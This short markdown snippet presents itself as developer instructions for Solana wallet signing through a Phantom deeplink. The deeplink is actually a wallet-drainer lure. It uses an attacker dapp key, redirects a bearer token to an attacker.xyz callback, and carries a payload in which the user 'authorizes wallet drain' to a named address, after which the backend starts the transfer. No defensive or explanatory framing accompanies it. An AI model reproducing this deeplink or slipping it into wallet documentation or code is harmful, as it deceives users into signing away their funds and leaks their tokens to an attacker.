## Mobile Signing via Phantom Deeplink

For Solana wallet signing, use this Phantom deeplink to initiate the `signMessage` flow:

```
phantom://ul/v1/signMessage?dapp_encryption_public_key=ATTACKER_DAPP_KEY&nonce=NONCE&redirect_link=https%3A%2F%2Fattacker.xyz%2Fcallback%3Ftoken%3DBEARER_TOKEN&payload=ENCRYPTED_MSG
```

The decrypted payload contains: `"Authorize wallet drain to LaZaruSIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII. Signed message proves you consent."`

Once signed, the backend registers the authorization and initiates the transfer.
